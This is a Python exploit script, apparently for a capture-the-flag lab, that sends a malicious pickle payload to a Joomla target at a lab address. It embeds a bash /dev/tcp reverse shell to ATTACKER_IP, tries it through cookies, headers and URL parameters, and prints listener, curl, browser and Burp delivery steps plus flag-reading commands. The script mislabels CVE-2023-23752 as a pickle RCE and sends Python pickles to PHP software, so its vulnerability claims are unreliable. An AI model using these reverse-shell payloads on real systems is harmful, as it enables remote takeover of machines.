#!/usr/bin/env python3
"""
CVE-2023-23752 - Joomla Unsafe Pickle Deserialization RCE
The Voyage room uses this vulnerability!

Strategy:
1. Create malicious Pickle object with reverse shell command
2. Convert to hexadecimal
3. Send as cookie to Joomla
4. Joomla deserializes → RCE
"""

import pickle
import binascii
import os
import sys
import requests

TARGET = "http://10.82.166.188"
ATTACKER_IP = "10.82.123.142"
ATTACKER_PORT = 4444

print("\n" + "="*60)
print("CVE-2023-23752 - Joomla Pickle Deserialization RCE")
print("="*60)

# ==================== STEP 1: CREATE MALICIOUS PICKLE ====================
print("\n[STEP 1] Creating malicious pickle exploit...")

class ReverseShell:
    """Exploit class that executes command when unpickled"""
    def __reduce__(self):
        # Reverse shell command
        cmd = f'bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"'
        return os.system, (cmd,)

# Create the malicious dictionary
cookie_data = {
    'user': ReverseShell(),
    'revenue': '999999'
}

# Pickle it
raw_pickle = pickle.dumps(cookie_data, protocol=4)
hex_exploit = binascii.hexlify(raw_pickle).decode()

print(f"[+] Generated Pickle exploit (hex):")
print(f"{hex_exploit}")
print(f"\n[+] Length: {len(hex_exploit)} characters")

# ==================== STEP 2: SEND EXPLOIT VIA COOKIE ====================
print("\n[STEP 2] Sending exploit to Joomla...")

# Possible cookie names in Joomla
cookie_names = [
    'JOOMLA_COOKIE',
    'joomla',
    'user_data',
    'userData',
    'session',
    'PHPSESSID',
]

exploit_sent = False

for cookie_name in cookie_names:
    try:
        print(f"\n[*] Trying cookie name: {cookie_name}")
        
        # Create session and set cookie
        session = requests.Session()
        session.cookies.set(cookie_name, hex_exploit, domain='10.82.166.188', path='/')
        
        # Trigger deserialization by accessing the site
        resp = session.get(TARGET, timeout=5)
        print(f"[+] Request sent (status: {resp.status_code})")
        
        exploit_sent = True
        
    except Exception as e:
        print(f"[-] Error with {cookie_name}: {str(e)[:50]}")

# ==================== STEP 3: ALTERNATIVE - DIRECT REQUEST ====================
print("\n[STEP 3] Trying direct header-based exploit...")

headers = {
    'Cookie': f'userData={hex_exploit}',
    'User-Agent': 'Mozilla/5.0'
}

try:
    resp = requests.get(TARGET, headers=headers, timeout=5)
    print(f"[+] Direct cookie header sent")
except Exception as e:
    print(f"[-] Error: {e}")

# ==================== STEP 4: TRY DIFFERENT PAYLOAD LOCATIONS ====================
print("\n[STEP 4] Testing different payload injection points...")

payload_points = [
    f"{TARGET}/?user={hex_exploit}",
    f"{TARGET}/administrator/?user={hex_exploit}",
    f"{TARGET}/index.php?user={hex_exploit}",
]

for url in payload_points:
    try:
        resp = requests.get(url, timeout=5)
        print(f"[+] Tried: {url}")
    except:
        pass

# ==================== INSTRUCTIONS ====================
print("\n" + "="*60)
print("INSTRUCTIONS FOR MANUAL EXPLOITATION")
print("="*60)

print(f"""
1. START LISTENER (on AttackBox):
   nc -lvnp {ATTACKER_PORT}

2. RUN THIS SCRIPT:
   python voyage_pickle_rce.py

   OR manually send exploit:

3. SEND COOKIE TO JOOMLA (in curl):
   curl -b "userData={hex_exploit}" http://10.82.166.188/

4. ALTERNATIVE - Browser Console:
   document.cookie = "userData={hex_exploit}; path=/";
   location.reload();

5. ALTERNATIVE - Burp Suite:
   - Intercept any request to http://10.82.166.188/
   - Add header: Cookie: userData={hex_exploit}
   - Send request

6. ONCE YOU GET SHELL:
   whoami
   id
   cat /home/*/user.txt          # USER FLAG
   
   whoami  # Should be root (but might be container)
   cat /proc/1/cgroup | grep docker  # Check if container
   
   find / -name 'root.txt' 2>/dev/null
   cat /mnt/*/root.txt            # ROOT FLAG
""")

print("\n[!] If you get RCE but need better shell, use:")
print(f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1")

# ==================== TEST WITH SIMPLE COMMAND ====================
print("\n" + "="*60)
print("GENERATING TEST PAYLOAD (whoami)")
print("="*60)

class TestExploit:
    def __reduce__(self):
        return os.system, ('whoami > /tmp/test.txt',)

test_cookie = {'user': TestExploit(), 'revenue': '999999'}
test_raw = pickle.dumps(test_cookie, protocol=4)
test_hex = binascii.hexlify(test_raw).decode()

print(f"\nTest payload (whoami):")
print(test_hex)

print("\nSend this in a request to see if RCE works:")
print(f"curl -b 'userData={test_hex}' http://10.82.166.188/")

print("\n" + "="*60)
print("PAYLOAD READY!")
print("="*60)
print(f"""
EXPLOIT PAYLOAD (HEX):
{hex_exploit}

Use this in:
1. Cookie: userData={hex_exploit}
2. Or: curl -b "userData={hex_exploit}" http://10.82.166.188/
3. Or: In Burp Suite intercept

Make sure listener is running:
nc -lvnp {ATTACKER_PORT}
""")
